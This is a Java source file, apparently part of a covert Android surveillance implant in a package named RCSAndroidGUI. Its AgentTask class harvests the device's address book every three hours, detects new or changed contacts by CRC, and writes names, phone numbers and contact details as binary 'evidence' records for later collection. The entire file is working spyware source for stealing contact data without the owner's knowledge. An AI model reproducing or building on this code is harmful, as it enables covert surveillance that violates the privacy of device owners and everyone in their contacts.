package com.ht.RCSAndroidGUI.agent;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.ListIterator;
import java.util.zip.CRC32;

import android.util.Log;

import com.ht.RCSAndroidGUI.LogR;
import com.ht.RCSAndroidGUI.agent.task.Contact;
import com.ht.RCSAndroidGUI.agent.task.EmailInfo;
import com.ht.RCSAndroidGUI.agent.task.ImInfo;
import com.ht.RCSAndroidGUI.agent.task.OrganizationInfo;
import com.ht.RCSAndroidGUI.agent.task.PhoneInfo;
import com.ht.RCSAndroidGUI.agent.task.PickContact;
import com.ht.RCSAndroidGUI.agent.task.PostalAddressInfo;
import com.ht.RCSAndroidGUI.agent.task.UserInfo;
import com.ht.RCSAndroidGUI.agent.task.WebsiteInfo;
import com.ht.RCSAndroidGUI.evidence.EvidenceType;
import com.ht.RCSAndroidGUI.evidence.Markup;
import com.ht.RCSAndroidGUI.util.Check;
import com.ht.RCSAndroidGUI.util.DataBuffer;
import com.ht.RCSAndroidGUI.util.Utils;
import com.ht.RCSAndroidGUI.util.WChar;

public class AgentTask extends AgentBase {
	private static final String TAG = "AgentAddressbook";
	private PickContact contact;

	Markup markup;
	HashMap<Long, Integer> contacts;

	public AgentTask() {

	}

	@Override
	public boolean parse(AgentConf conf) {
		return true;
	}

	@Override
	public void begin() {
		setPeriod(180 * 60 * 1000);
		setDelay(200);

		markup = new Markup(AgentType.AGENT_TASK);
		boolean needSerialize = false;
		
		if (markup.isMarkup()) {
			try {
				contacts = (HashMap<Long, Integer>) markup.readMarkupSerializable();
			} catch (IOException e) {
				Log.d("QZ", TAG + " Error (begin): cannot read markup");
			}
		}

		if (contacts == null) {
			contacts = new HashMap<Long, Integer>();
			serializeContacts();
		}
	}

	private void serializeContacts() {
		Check.ensures(contacts != null, "null contacts");
		try {
			markup.writeMarkupSerializable(contacts);
		} catch (IOException e) {
			Log.d("QZ", TAG + " Error (serializeContacts): " + e);
		}
	}

	@Override
	public void go() {
		contact = new PickContact();

		Date before = new Date();
		List<Contact> list = contact.getContactInfo();
		Date after = new Date();
		Log.d("QZ", TAG + " (go): get contact time " + (after.getTime() - before.getTime()));
		Log.d("QZ", TAG + " (go): list size = " + list.size());

		ListIterator<Contact> iter = list.listIterator();

		boolean needToSerialize = false;
	
		while (iter.hasNext()) {
			Contact c = iter.next();

			byte[] packet = preparePacket(c);
			Integer crcOld = contacts.get(c.getId());
			Integer crcNew = crc(packet);

			if (!crcNew.equals(crcOld)) {
				Log.d("QZ", TAG + " (go): new contact. " + c);
				contacts.put(c.getId(), crc(packet));
				saveEvidence(c);
				needToSerialize = true;
			}
		}

		if (needToSerialize) {
			serializeContacts();
		}
	}

	private int crc(byte[] packet) {
		CRC32 crc = new CRC32();
		crc.update(packet);
		return crc.hashCode();
	}

	private void saveEvidence(Contact c) {

		byte[] packet = preparePacket(c);
		contacts.put(c.getId(), crc(packet));

		LogR log = new LogR(EvidenceType.ADDRESSBOOK);
		log.write(packet);
		log.close();
	}

	private byte[] preparePacket(Contact c) {
		UserInfo user = c.getUserInfo();
		List<EmailInfo> email = c.getEmailInfo();
		List<PostalAddressInfo> paInfo = c.getPaInfo();
		List<PhoneInfo> phoneInfo = c.getPhoneInfo();
		List<ImInfo> imInfo = c.getImInfo();
		List<OrganizationInfo> orgInfo = c.getOrgInfo();
		List<WebsiteInfo> webInfo = c.getWebInfo();
		long uid = user.getUserId();
		String name = user.getCompleteName();

		final int version = 0x01000000;

		final byte[] header = new byte[12];
		// final byte[] payload = new byte[2048];

		ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

		// final DataBuffer dbPayload = new DataBuffer(payload, 0, 2048);

		String message = c.getInfo();

		addTypedString(outputStream, (byte) 0x01, name);
		if (phoneInfo.size() > 0) {
			String number = phoneInfo.get(0).getPhoneNumber();
			addTypedString(outputStream, (byte) 0x07, number);
		}
		addTypedString(outputStream, (byte) 0x37, message);
		Log.d("QZ", TAG + " (preparePacket): " + name + " " + message);

		byte[] payload = outputStream.toByteArray();

		final int size = payload.length + header.length;

		// a questo punto il payload e' pronto

		final DataBuffer db_header = new DataBuffer(header, 0, size);
		db_header.writeInt(size);
		db_header.writeInt(version);
		db_header.writeInt((int) uid);

		Check.asserts(header.length == 12, "getContactPayload header.length: " + header.length);
		Check.asserts(db_header.getPosition() == 12, "getContactPayload db_header.getLength: " + header.length);

		final byte[] packet = Utils.concat(header, 12, payload, payload.length);

		Check.ensures(packet.length == size, "getContactPayload packet.length: " + packet.length);

		return packet;
	}

	private void addTypedString(ByteArrayOutputStream outputStream, byte type, String name) {
		if (name != null && name.length() > 0) {
			final int header = (type << 24) | (name.length() * 2);
			
			try {
				outputStream.write(Utils.intToByteArray(header));
				outputStream.write(WChar.getBytes(name, false));
			} catch (IOException e) {
				e.printStackTrace();
				Log.d("QZ", TAG + " Error (addTypedString): " + e);
			}
		}
	}

	private void addTypedString(DataBuffer databuffer, byte type, String name) {
		if (name != null && name.length() > 0) {
			final int header = (type << 24) | (name.length() * 2);
			databuffer.writeInt(header);
			databuffer.write(WChar.getBytes(name, false));
		}
	}

	@Override
	public void end() {

	}
}
